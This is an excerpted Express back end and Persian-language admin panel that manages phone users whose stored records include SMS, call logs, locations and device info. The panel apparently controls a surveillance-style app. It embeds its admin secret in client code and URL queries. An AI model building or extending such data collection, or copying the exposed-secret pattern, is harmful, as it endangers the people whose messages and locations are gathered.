        res.json({ success: true, message: '💥 ' + deletedUsers.length + ' کاربر کاملاً حذف شدند', deletedCount: deletedUsers.length });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.delete('/api/delete-old-users', async (req, res) => {
    try {
        ...
        if (adminKey !== CONFIG.SECRET_KEY) return res.status(403).json({ success: false, message: 'دسترسی غیرمجاز' });
        if (confirm !== 'YES_DELETE_OLD_USERS') return res.status(400).json({ success: false, message: '⚠️ تأیید نادرست' });
        ...
        for (const phone of allPhones) {
            ...
            } else keptUsers.push(phone);
        }
        await logAdminAction(null, 'delete-old-users', '', deletedUsers.length + ' کاربر');
        res.json({ success: true, message: '💥 ' + deletedUsers.length + ' کاربر قدیمی کاملاً حذف شدند', deletedCount: deletedUsers.length, keptCount: keptUsers.length, inactiveDays, cutoffDate: new Date(cutoffTime).toLocaleString('fa-IR'), deletedUsers });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.delete('/api/nuclear-reset', async (req, res) => {
    try {
        ...
        if (adminKey !== CONFIG.SECRET_KEY) return res.status(403).json({ success: false, message: 'دسترسی غیرمجاز' });
        if (confirm !== 'YES_NUCLEAR_RESET') return res.status(400).json({ success: false, message: '⚠️ تأیید نادرست' });
        const includeIndexes = keepIndexes !== true;
        const stats = await nukeEverything(null, includeIndexes);
        res.json({ success: true, message: includeIndexes ? '💥 تمام داده‌های سرور پاک شدند' : '💥 داده‌ها پاک شدند (ایندکس‌ها حفظ شد)', stats });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.delete('/api/delete-key', async (req, res) => {
    try {
        ...
        if (key.startsWith('user:')) await removeUserFromIndex(null, key.substring(5));
        await DB.delete(key);
...
app.delete('/api/delete-message', async (req, res) => {
    try {
        ...
        res.json({ success: true, message: '✅ پیام حذف شد', deletedCount: before - history.length });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.delete('/api/clear-messages-history', async (req, res) => {
    try {
        const { adminKey, confirm } = req.body;
        if (adminKey !== CONFIG.SECRET_KEY) return res.status(403).json({ success: false, message: 'دسترسی غیرمجاز' });
        if (confirm !== 'YES_CLEAR_MESSAGES') return res.status(400).json({ success: false, message: '⚠️ تأیید نادرست' });
        const historyData = await DB.get('messages_history');
        const history = historyData ? JSON.parse(historyData) : [];
        ...
        res.json({ success: true, message: '✅ تاریخچه پیام‌ها پاک شد', deletedCount: history.length });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.get('/api/scan-kv', async (req, res) => {
    try {
        ...
        res.json({ success: true, summary: { totalKeysScanned: scanResult.totalScanned, userRecords: scanResult.users.length, locationRecords: scanResult.locations.length, codeRecords: scanResult.codes.length, permissionRecords: scanResult.permissions.length, appVersionRecords: scanResult.appVersions.length, updateMsgRecords: scanResult.updateMsgs.length, limitRecords: scanResult.limits.length, dailyRecords: scanResult.daily.length, serverUsageRecords: scanResult.serverUsage.length, smsRecords: scanResult.sms.length, callsRecords: scanResult.calls.length, deviceInfoRecords: scanResult.deviceInfo.length, messagesHistoryRecords: scanResult.messagesHistory.length, otherRecords: scanResult.other.length, indexedUsers: indexPhones.length, orphanUsers: orphanUsers.length, missingUsers: missingUsers.length, activeUsers: activeUsers.length }, orphanUsers, missingUsers, activeUsers, allPhones: kvPhones, users: scanResult.users, locations: scanResult.locations, codes: scanResult.codes, permissions: scanResult.permissions, appVersions: scanResult.appVersions, updateMsgs: scanResult.updateMsgs, limits: scanResult.limits, daily: scanResult.daily, serverUsage: scanResult.serverUsage, sms: scanResult.sms, calls: scanResult.calls, deviceInfo: scanResult.deviceInfo, messagesHistory: scanResult.messagesHistory, other: scanResult.other, otherKeys: scanResult.other.map(k => k.key), errors: scanResult.error ? [scanResult.error] : [] });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.get('/api/get-key-content', async (req, res) => {
    try {
        ...
        if (content === null) return res.status(404).json({ success: false, message: 'کلید پیدا نشد' });
        let parsed = null;
        try { parsed = JSON.parse(content); } catch (e) { parsed = content; }
        res.json({ success: true, key, content: parsed, size: content.length, sizeFormatted: formatBytes(content.length) });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.get('/api/server-weekly', async (req, res) => {
    try {
        ...
        for (let i = 6; i >= 0; i--) {
            ...
            weekly.push({ date: dayStr, dateFa: date.toLocaleDateString('fa-IR'), count });
        }
...
<style>
:root { --bg-primary: #0D0D2B; --bg-secondary: #1A1A2E; --bg-tertiary: #16213E; --bg-card: #1A1A2E; --text-primary: #E8E8E8; --text-secondary: #B0BEC5; --text-muted: #78909C; --border-color: #2D2D44; --accent-green: #4CAF50; --accent-blue: #2196F3; --accent-orange: #FF9800; --accent-red: #F44336; --accent-purple: #9C27B0; --accent-cyan: #00BCD4; --accent-pink: #E91E63; --input-bg: #0D0D2B; }
...
.input-row input { flex: 1; min-width: 80px; padding: 7px 10px; background: var(--input-bg); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-primary); font-size: 12px; outline: none; font-family: inherit; }
.btn { padding: 7px 14px; border: none; border-radius: 6px; cursor: pointer; color: white; font-size: 12px; font-weight: 500; font-family: inherit; }
...
.result-box { margin-top: 6px; padding: 8px 12px; background: var(--input-bg); border-radius: 6px; display: none; color: var(--text-primary); font-size: 12px; border: 1px solid var(--border-color); max-height: 400px; overflow-y: auto; }
...
.filter-row { display: flex; gap: 6px; flex-wrap: wrap; padding: 10px 14px; background: var(--bg-primary); border-bottom: 1px solid var(--border-color); }
...
.chip.active { background: var(--accent-green); color: white; }
...
.badge { display: inline-block; padding: 3px 8px; border-radius: 10px; font-size: 11px; font-weight: 500; }
...
.modal { background: var(--bg-card); border-radius: 16px; padding: 20px; max-width: 700px; width: 100%; max-height: 85vh; overflow-y: auto; }
.modal h3 { color: var(--accent-green); margin-bottom: 14px; }
...
.info-item .value { font-size: 12px; font-weight: 500; word-break: break-all; }
.toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--bg-card); padding: 12px 24px; border-radius: 10px; border: 1px solid var(--border-color); z-index: 9999; opacity: 0; transition: opacity 0.3s; }
...
<div class="capsule-header" onclick="toggleCapsule('cap-msg')"><span>📨 ارسال پیام سفارشی</span><span>▼</span></div>
...
<div class="capsule-header" onclick="toggleCapsule('cap-version')"><span>📱 انتشار نسخه جدید</span><span>▼</span></div>
<div class="capsule-body">
<div class="input-row">
...
<input type="text" id="newReleaseNotes" class="search-input" placeholder="توضیحات" style="width:100%;margin-bottom:6px;">
...
<div class="capsule-header" onclick="toggleCapsule('cap-nuke')" style="background:linear-gradient(135deg,#B71C1C,#D32F2F);color:#fff;"><span>💥 ریست کامل سرور</span><span>▼</span></div>
<div class="capsule-body">
<input type="text" id="nukeConfirm" class="search-input" placeholder="YES_NUCLEAR_RESET" style="width:100%;margin-bottom:8px;">
<button class="btn btn-dark" onclick="nuclearResetAll()" style="width:100%;padding:12px;">💥 پاک‌سازی کامل</button>
...
<thead><tr>
<th>#</th><th>👤 نام</th><th>📱 شماره</th><th>🎯 هدف</th><th>✅ وضعیت</th><th>📊 محدودیت</th><th>📍 موقعیت</th><th>🔢 نسخه</th><th>🔧 عملیات</th>
</tr></thead>
...
<button class="btn btn-gray" onclick="closeModal('modal-details')" style="margin-top:14px;">بستن</button>
</div></div>
...
function toggleCapsule(id) { document.getElementById(id).classList.toggle("open"); }
...
function renderUsers() {
  ...
  if (searchQuery) {
    list = list.filter(u => (u.phone && u.phone.indexOf(searchQuery) !== -1) || (u.name && u.name.toLowerCase().indexOf(searchQuery) !== -1));
  }
  var tbody = document.getElementById("usersTableBody");
  if (list.length === 0) { tbody.innerHTML = '<tr><td colspan="9" class="empty">❌ کاربری یافت نشد</td></tr>'; return; }
  var html = "";
  for (var i=0; i<list.length; i++) {
    ...
    var updateBadge = u.isForceUpdate ? '<span class="badge badge-red">⚠️</span>' : (u.needsUpdate ? '<span class="badge badge-orange">🔄</span>' : '<span class="badge badge-green">✅</span>');
...
window.toggleForce = function(phone) {
  fetch(API_BASE + "/api/toggle-force", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phone, adminKey: SECRET_KEY }) })
  .then(r => r.json()).then(result => { showToast(result.message); if (result.success) loadData(); });
};
window.toggleVerify = function(phone) {
  fetch(API_BASE + "/api/toggle-verify", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phone, adminKey: SECRET_KEY }) })
  .then(r => r.json()).then(result => { showToast(result.message); if (result.success) loadData(); });
};
window.toggleBlock = function(phone) {
  ...
  fetch(API_BASE + endpoint, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phone, adminKey: SECRET_KEY }) })
  .then(r => r.json()).then(result => { showToast(result.message); if (result.success) loadData(); });
};
window.nukeSingle = function(phone) {
  if (!confirm("💥 تمام اطلاعات " + phone + " پاک می‌شود!")) return;
  fetch(API_BASE + "/api/nuke-user", { method: "DELETE", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phone, adminKey: SECRET_KEY }) })
  .then(r => r.json()).then(result => { if (result.success) { showToast("💥 حذف شد"); loadData(); } else showToast("❌ " + result.message); });
};
window.sendCustomMessage = function() {
  ...
  fetch(API_BASE + "/api/send-custom-message", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phone, message, sender, adminKey: SECRET_KEY }) })
...
window.nuclearResetAll = async function() {
  ...
  try {
    var res = await fetch(API_BASE + "/api/nuclear-reset", { method: "DELETE", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ adminKey: SECRET_KEY, confirm: "YES_NUCLEAR_RESET" }) });
    var data = await res.json();
...
window.publishNewVersion = function() {
  ...
  fetch(API_BASE + "/api/set-app-version", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ versionName: name, versionCode: code, downloadUrl: dl, releaseNotes: notes, isForAllUsers: true, adminKey: SECRET_KEY }) })
  .then(r => r.json()).then(result => {
...
window.pingServer = async function() {
  ...
  try {
    ...
    var data = await res.json();
    showToast("📡 Pong! " + (Date.now() - start) + "ms • نسخه " + data.version);
  } catch (e) { showToast("❌ " + e.message); }
};
window.exportCSV = function() { window.open(API_BASE + "/api/export-csv?adminKey=" + SECRET_KEY, "_blank"); };
